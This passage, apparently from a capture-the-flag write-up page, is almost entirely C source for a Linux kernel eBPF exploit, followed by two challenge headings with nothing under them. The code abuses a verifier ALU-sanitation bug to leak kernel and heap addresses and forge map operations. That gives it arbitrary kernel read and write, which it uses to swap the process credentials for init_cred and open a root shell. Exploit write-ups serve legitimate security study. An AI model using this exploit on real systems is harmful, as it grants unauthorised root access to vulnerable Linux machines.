</span></span><span class="line"><span class="cl">    <span class="nf">setup_bpf_prog</span><span class="p">(</span><span class="n">insns</span><span class="p">,</span> <span class="n">insncnt</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">write</span><span class="p">(</span><span class="n">socks</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="o">&amp;</span><span class="n">val</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">val</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">idx</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">bpf_map_info</span> <span class="n">map_info</span> <span class="o">=</span> <span class="p">{};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">oob_map_fd</span> <span class="o">=</span> <span class="nf">bpf_map_create</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mh">0x150</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">arb_read_write_map_fd</span> <span class="o">=</span> <span class="nf">bpf_map_create</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">info_map_fd</span> <span class="o">=</span> <span class="nf">bpf_map_create</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">oob_map_fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;create_map&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">bpf_insn</span> <span class="n">kleak_prog</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// load map_ptr_or_null in BPF_REG_0
</span></span></span><span class="line"><span class="cl">        <span class="nf">BPF_MOV64_IMM</span><span class="p">(</span><span class="n">BPF_REG_0</span><span class="p">,</span> <span class="mi">0</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_STX_MEM</span><span class="p">(</span><span class="n">BPF_W</span><span class="p">,</span> <span class="n">BPF_REG_10</span><span class="p">,</span> <span class="n">BPF_REG_0</span><span class="p">,</span> <span class="o">-</span><span class="mi">4</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_MOV64_REG</span><span class="p">(</span><span class="n">BPF_REG_6</span><span class="p">,</span> <span class="n">BPF_REG_1</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_LD_MAP_FD</span><span class="p">(</span><span class="n">BPF_REG_1</span><span class="p">,</span> <span class="n">oob_map_fd</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_MOV64_REG</span><span class="p">(</span><span class="n">BPF_REG_2</span><span class="p">,</span> <span class="n">BPF_REG_10</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_ALU64_IMM</span><span class="p">(</span><span class="n">BPF_ADD</span><span class="p">,</span> <span class="n">BPF_REG_2</span><span class="p">,</span> <span class="o">-</span><span class="mi">4</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_CALL_FUNC</span><span class="p">(</span><span class="n">BPF_FUNC_map_lookup_elem</span><span class="p">),</span> <span class="c1">// returns map_ptr + 0x110 (offset of .values in array_map)
</span></span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="c1">// map_ptr_or_null -&gt; map_ptr
</span></span></span><span class="line"><span class="cl">        <span class="nf">BPF_JMP_IMM</span><span class="p">(</span><span class="n">BPF_JNE</span><span class="p">,</span> <span class="n">BPF_REG_0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_EXIT_INSN</span><span class="p">(),</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// trigger vuln and make eBPF think we are still map_ptr + 0x110 but in reality we&#39;re map_ptr + 0x0
</span></span></span><span class="line"><span class="cl">        <span class="nf">BPF_MOV64_REG</span><span class="p">(</span><span class="n">BPF_REG_7</span><span class="p">,</span> <span class="n">BPF_REG_0</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// ALU Sanitation will set alu_limit = 0 but alu_limit - 1 will be used hence any value can be used
</span></span></span><span class="line"><span class="cl">        <span class="nf">BPF_MOV64_IMM</span><span class="p">(</span><span class="n">BPF_REG_0</span><span class="p">,</span> <span class="mh">0x110</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_MOV64_IMM</span><span class="p">(</span><span class="n">BPF_REG_1</span><span class="p">,</span> <span class="mi">64</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_ALU64_REG</span><span class="p">(</span><span class="n">BPF_RSH</span><span class="p">,</span> <span class="n">BPF_REG_0</span><span class="p">,</span> <span class="n">BPF_REG_1</span><span class="p">),</span> <span class="c1">// the bug
</span></span></span><span class="line"><span class="cl">        <span class="nf">BPF_ALU64_REG</span><span class="p">(</span><span class="n">BPF_SUB</span><span class="p">,</span> <span class="n">BPF_REG_7</span><span class="p">,</span> <span class="n">BPF_REG_0</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_LDX_MEM</span><span class="p">(</span><span class="n">BPF_DW</span><span class="p">,</span> <span class="n">BPF_REG_8</span><span class="p">,</span> <span class="n">BPF_REG_7</span><span class="p">,</span> <span class="mi">0</span><span class="p">),</span> <span class="c1">// load the ptr (kbase leak)
</span></span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_ALU64_IMM</span><span class="p">(</span><span class="n">BPF_ADD</span><span class="p">,</span> <span class="n">BPF_REG_7</span><span class="p">,</span> <span class="mh">0xc0</span><span class="p">),</span> <span class="c1">// map_ptr + 0x0 -&gt; map_ptr + 0xc0
</span></span></span><span class="line"><span class="cl">        <span class="nf">BPF_LDX_MEM</span><span class="p">(</span><span class="n">BPF_DW</span><span class="p">,</span> <span class="n">BPF_REG_9</span><span class="p">,</span> <span class="n">BPF_REG_7</span><span class="p">,</span> <span class="mi">0</span><span class="p">),</span> <span class="c1">// load the ptr (heap leak)
</span></span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// write the read ptr to map for reading it from userspace
</span></span></span><span class="line"><span class="cl">        <span class="nf">BPF_ALU64_IMM</span><span class="p">(</span><span class="n">BPF_ADD</span><span class="p">,</span> <span class="n">BPF_REG_7</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">),</span> <span class="c1">// make map_ptr + 0xc0 to map_ptr + 0x110
</span></span></span><span class="line"><span class="cl">        <span class="nf">BPF_STX_MEM</span><span class="p">(</span><span class="n">BPF_DW</span><span class="p">,</span> <span class="n">BPF_REG_7</span><span class="p">,</span> <span class="n">BPF_REG_8</span><span class="p">,</span> <span class="mi">0</span><span class="p">),</span> <span class="c1">// write array_map_ops ptr to maps_ptr + 0x110
</span></span></span><span class="line"><span class="cl">        <span class="nf">BPF_STX_MEM</span><span class="p">(</span><span class="n">BPF_DW</span><span class="p">,</span> <span class="n">BPF_REG_7</span><span class="p">,</span> <span class="n">BPF_REG_9</span><span class="p">,</span> <span class="mi">8</span><span class="p">),</span> <span class="c1">// write *(map_ptr + 0xc0) to maps_ptr + 0x118
</span></span></span><span class="line"><span class="cl">        <span class="nf">BPF_EXIT_INSN</span><span class="p">(),</span>
</span></span><span class="line"><span class="cl">    <span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">run_bpf_prog</span><span class="p">(</span><span class="n">kleak_prog</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">kleak_prog</span><span class="p">)</span><span class="o">/</span><span class="k">sizeof</span><span class="p">(</span><span class="n">kleak_prog</span><span class="p">[</span><span class="mi">0</span><span class="p">]));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">array_map_ops</span> <span class="o">=</span> <span class="nf">bpf_map_lookup_elem</span><span class="p">(</span><span class="n">oob_map_fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">map_ptr</span> <span class="o">=</span> <span class="nf">bpf_map_lookup_elem</span><span class="p">(</span><span class="n">oob_map_fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0xc0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">map_ptr_values</span> <span class="o">=</span> <span class="n">map_ptr</span> <span class="o">+</span> <span class="mh">0x110</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">kbase</span> <span class="o">=</span> <span class="n">array_map_ops</span> <span class="o">-</span> <span class="n">ARRAY_MAP_OPS_OFFSET</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">__per_cpu_offset</span> <span class="o">=</span> <span class="n">kbase</span> <span class="o">+</span> <span class="n">PERCPU_OFFSET</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;array_map_ops: %p</span><span class="se">\n</span><span class="s">kbase: %p</span><span class="se">\n</span><span class="s">map_ptr: %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">array_map_ops</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">kbase</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">map_ptr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">bpf_insn</span> <span class="n">overwrite_ops</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_MOV64_REG</span><span class="p">(</span><span class="n">BPF_REG_6</span><span class="p">,</span> <span class="n">BPF_REG_1</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_MOV64_IMM</span><span class="p">(</span><span class="n">BPF_REG_0</span><span class="p">,</span> <span class="mi">0</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_STX_MEM</span><span class="p">(</span><span class="n">BPF_W</span><span class="p">,</span> <span class="n">BPF_REG_10</span><span class="p">,</span> <span class="n">BPF_REG_0</span><span class="p">,</span> <span class="o">-</span><span class="mi">4</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_MOV64_REG</span><span class="p">(</span><span class="n">BPF_REG_2</span><span class="p">,</span> <span class="n">BPF_REG_10</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_ALU64_IMM</span><span class="p">(</span><span class="n">BPF_ADD</span><span class="p">,</span> <span class="n">BPF_REG_2</span><span class="p">,</span> <span class="o">-</span><span class="mi">4</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_LD_MAP_FD</span><span class="p">(</span><span class="n">BPF_REG_1</span><span class="p">,</span> <span class="n">oob_map_fd</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_CALL_FUNC</span><span class="p">(</span><span class="n">BPF_FUNC_map_lookup_elem</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_JMP_IMM</span><span class="p">(</span><span class="n">BPF_JNE</span><span class="p">,</span> <span class="n">BPF_REG_0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_EXIT_INSN</span><span class="p">(),</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// setup fake bpf_map_ops struct with only needed values
</span></span></span><span class="line"><span class="cl">        <span class="nf">BPF_MOV64_REG</span><span class="p">(</span><span class="n">BPF_REG_7</span><span class="p">,</span> <span class="n">BPF_REG_0</span><span class="p">),</span> <span class="c1">// move map_ptr + 0x110
</span></span></span><span class="line"><span class="cl">        <span class="nf">BPF_MOV64_IMM</span><span class="p">(</span><span class="n">BPF_REG_0</span><span class="p">,</span> <span class="n">kbase</span> <span class="o">+</span> <span class="n">ARRAY_MAP_UPDATE_ELEM_OFFSET</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_STX_MEM</span><span class="p">(</span><span class="n">BPF_DW</span><span class="p">,</span> <span class="n">BPF_REG_7</span><span class="p">,</span> <span class="n">BPF_REG_0</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_MOV64_IMM</span><span class="p">(</span><span class="n">BPF_REG_0</span><span class="p">,</span> <span class="n">kbase</span> <span class="o">+</span> <span class="n">ARRAY_MAP_LOOKUP_ELEM_OFFSET</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_STX_MEM</span><span class="p">(</span><span class="n">BPF_DW</span><span class="p">,</span> <span class="n">BPF_REG_7</span><span class="p">,</span> <span class="n">BPF_REG_0</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_MOV64_IMM</span><span class="p">(</span><span class="n">BPF_REG_0</span><span class="p">,</span> <span class="n">kbase</span> <span class="o">+</span> <span class="mh">0x20e9c0</span><span class="p">),</span> <span class="c1">// array_of_map_gen_lookup
</span></span></span><span class="line"><span class="cl">        <span class="nf">BPF_STX_MEM</span><span class="p">(</span><span class="n">BPF_DW</span><span class="p">,</span> <span class="n">BPF_REG_7</span><span class="p">,</span> <span class="n">BPF_REG_0</span><span class="p">,</span> <span class="mi">19</span> <span class="o">*</span> <span class="mi">8</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_MOV64_IMM</span><span class="p">(</span><span class="n">BPF_REG_0</span><span class="p">,</span> <span class="n">kbase</span> <span class="o">+</span> <span class="mh">0x20eff0</span><span class="p">),</span> <span class="c1">// array_map_free
</span></span></span><span class="line"><span class="cl">        <span class="nf">BPF_STX_MEM</span><span class="p">(</span><span class="n">BPF_DW</span><span class="p">,</span> <span class="n">BPF_REG_7</span><span class="p">,</span> <span class="n">BPF_REG_0</span><span class="p">,</span> <span class="mi">3</span> <span class="o">*</span> <span class="mi">8</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_MOV64_REG</span><span class="p">(</span><span class="n">BPF_REG_2</span><span class="p">,</span> <span class="n">BPF_REG_10</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_ALU64_IMM</span><span class="p">(</span><span class="n">BPF_ADD</span><span class="p">,</span> <span class="n">BPF_REG_2</span><span class="p">,</span> <span class="o">-</span><span class="mi">4</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_LD_MAP_FD</span><span class="p">(</span><span class="n">BPF_REG_1</span><span class="p">,</span> <span class="n">arb_read_write_map_fd</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_CALL_FUNC</span><span class="p">(</span><span class="n">BPF_FUNC_map_lookup_elem</span><span class="p">),</span> <span class="c1">// get values ptr
</span></span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_JMP_IMM</span><span class="p">(</span><span class="n">BPF_JNE</span><span class="p">,</span> <span class="n">BPF_REG_0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_EXIT_INSN</span><span class="p">(),</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_MOV64_REG</span><span class="p">(</span><span class="n">BPF_REG_7</span><span class="p">,</span> <span class="n">BPF_REG_0</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// trigger vuln
</span></span></span><span class="line"><span class="cl">        <span class="nf">BPF_MOV64_IMM</span><span class="p">(</span><span class="n">BPF_REG_0</span><span class="p">,</span> <span class="mh">0x110</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_MOV64_IMM</span><span class="p">(</span><span class="n">BPF_REG_1</span><span class="p">,</span> <span class="mi">64</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_ALU64_REG</span><span class="p">(</span><span class="n">BPF_RSH</span><span class="p">,</span> <span class="n">BPF_REG_0</span><span class="p">,</span> <span class="n">BPF_REG_1</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_ALU64_REG</span><span class="p">(</span><span class="n">BPF_SUB</span><span class="p">,</span> <span class="n">BPF_REG_7</span><span class="p">,</span> <span class="n">BPF_REG_0</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_LD_IMM64</span><span class="p">(</span><span class="n">BPF_REG_0</span><span class="p">,</span> <span class="n">map_ptr_values</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// overwrite map_ops with oob_map_ptr
</span></span></span><span class="line"><span class="cl">        <span class="nf">BPF_STX_MEM</span><span class="p">(</span><span class="n">BPF_DW</span><span class="p">,</span> <span class="n">BPF_REG_7</span><span class="p">,</span> <span class="n">BPF_REG_0</span><span class="p">,</span> <span class="mi">0</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_EXIT_INSN</span><span class="p">(),</span>
</span></span><span class="line"><span class="cl">    <span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">run_bpf_prog</span><span class="p">(</span><span class="n">overwrite_ops</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">overwrite_ops</span><span class="p">)</span><span class="o">/</span><span class="k">sizeof</span><span class="p">(</span><span class="n">overwrite_ops</span><span class="p">[</span><span class="mi">0</span><span class="p">]));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">bpf_insn</span> <span class="n">arb_read_write</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_MOV64_REG</span><span class="p">(</span><span class="n">BPF_REG_6</span><span class="p">,</span> <span class="n">BPF_REG_1</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_MOV64_IMM</span><span class="p">(</span><span class="n">BPF_REG_0</span><span class="p">,</span> <span class="mi">0</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_STX_MEM</span><span class="p">(</span><span class="n">BPF_W</span><span class="p">,</span> <span class="n">BPF_REG_10</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">-</span><span class="mi">4</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_MOV64_REG</span><span class="p">(</span><span class="n">BPF_REG_2</span><span class="p">,</span> <span class="n">BPF_REG_10</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_ALU64_IMM</span><span class="p">(</span><span class="n">BPF_ADD</span><span class="p">,</span> <span class="n">BPF_REG_2</span><span class="p">,</span> <span class="o">-</span><span class="mi">4</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_LD_MAP_FD</span><span class="p">(</span><span class="n">BPF_REG_1</span><span class="p">,</span> <span class="n">arb_read_write_map_fd</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_CALL_FUNC</span><span class="p">(</span><span class="n">BPF_FUNC_map_lookup_elem</span><span class="p">),</span> <span class="c1">// will use array_of_map_gen_lookup
</span></span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_JMP_IMM</span><span class="p">(</span><span class="n">BPF_JNE</span><span class="p">,</span> <span class="n">BPF_REG_0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_EXIT_INSN</span><span class="p">(),</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_MOV64_REG</span><span class="p">(</span><span class="n">BPF_REG_8</span><span class="p">,</span> <span class="n">BPF_REG_0</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_LD_ABS</span><span class="p">(</span><span class="n">BPF_B</span><span class="p">,</span> <span class="mi">0</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_MOV64_REG</span><span class="p">(</span><span class="n">BPF_REG_9</span><span class="p">,</span> <span class="n">BPF_REG_0</span><span class="p">),</span> <span class="c1">// decide bit for arb_read or arb_write
</span></span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_MOV64_REG</span><span class="p">(</span><span class="n">BPF_REG_2</span><span class="p">,</span> <span class="n">BPF_REG_10</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_ALU64_IMM</span><span class="p">(</span><span class="n">BPF_ADD</span><span class="p">,</span> <span class="n">BPF_REG_2</span><span class="p">,</span> <span class="o">-</span><span class="mi">4</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_LD_MAP_FD</span><span class="p">(</span><span class="n">BPF_REG_1</span><span class="p">,</span> <span class="n">info_map_fd</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_CALL_FUNC</span><span class="p">(</span><span class="n">BPF_FUNC_map_lookup_elem</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_JMP_IMM</span><span class="p">(</span><span class="n">BPF_JNE</span><span class="p">,</span> <span class="n">BPF_REG_0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_EXIT_INSN</span><span class="p">(),</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_JMP_IMM</span><span class="p">(</span><span class="n">BPF_JEQ</span><span class="p">,</span> <span class="n">BPF_REG_9</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">4</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_LDX_MEM</span><span class="p">(</span><span class="n">BPF_DW</span><span class="p">,</span> <span class="n">BPF_REG_7</span><span class="p">,</span> <span class="n">BPF_REG_8</span><span class="p">,</span> <span class="mi">0</span><span class="p">),</span> <span class="c1">// arb_read
</span></span></span><span class="line"><span class="cl">        <span class="nf">BPF_STX_MEM</span><span class="p">(</span><span class="n">BPF_DW</span><span class="p">,</span> <span class="n">BPF_REG_0</span><span class="p">,</span> <span class="n">BPF_REG_7</span><span class="p">,</span> <span class="mi">0</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_MOV64_IMM</span><span class="p">(</span><span class="n">BPF_REG_0</span><span class="p">,</span> <span class="mi">0</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_EXIT_INSN</span><span class="p">(),</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_LDX_MEM</span><span class="p">(</span><span class="n">BPF_DW</span><span class="p">,</span> <span class="n">BPF_REG_7</span><span class="p">,</span> <span class="n">BPF_REG_0</span><span class="p">,</span> <span class="mi">0</span><span class="p">),</span> <span class="c1">// arb_write
</span></span></span><span class="line"><span class="cl">        <span class="nf">BPF_STX_MEM</span><span class="p">(</span><span class="n">BPF_DW</span><span class="p">,</span> <span class="n">BPF_REG_8</span><span class="p">,</span> <span class="n">BPF_REG_7</span><span class="p">,</span> <span class="mi">0</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_MOV64_IMM</span><span class="p">(</span><span class="n">BPF_REG_0</span><span class="p">,</span> <span class="mi">0</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_EXIT_INSN</span><span class="p">(),</span>
</span></span><span class="line"><span class="cl">    <span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">setup_bpf_prog</span><span class="p">(</span><span class="n">arb_read_write</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">arb_read_write</span><span class="p">)</span><span class="o">/</span><span class="k">sizeof</span><span class="p">(</span><span class="n">arb_read_write</span><span class="p">[</span><span class="mi">0</span><span class="p">]));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">current_task_struct</span> <span class="o">=</span> <span class="nf">arb_read</span><span class="p">(</span><span class="nf">arb_read</span><span class="p">(</span><span class="n">__per_cpu_offset</span><span class="p">)</span> <span class="o">+</span> <span class="n">current_task</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">init_cred</span> <span class="o">=</span> <span class="n">kbase</span> <span class="o">+</span> <span class="n">INIT_CRED_OFFSET</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">arb_write</span><span class="p">(</span><span class="n">current_task_struct</span> <span class="o">+</span> <span class="n">CRED_OFFSET</span><span class="p">,</span> <span class="n">init_cred</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">system</span><span class="p">(</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
</div>
</div><h4 class="heading-element" id="d3ctf-2022__d3bpf-v2"><span>D^3CTF 2022__d3bpf-v2</span>
  <a href="#d3ctf-2022__d3bpf-v2" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><h4 class="heading-element" id="uoftctf-2026----extended-ebpf"><span>UofTCTF 2026  - <a href="https://github.com/UofTCTF/uoftctf-2026-chals-public/blob/main/eebpf" target="_blank" rel="external nofollow noopener noreferrer">extended-eBPF</a></span>
  <a href="#uoftctf-2026----extended-ebpf" class="heading-mark">
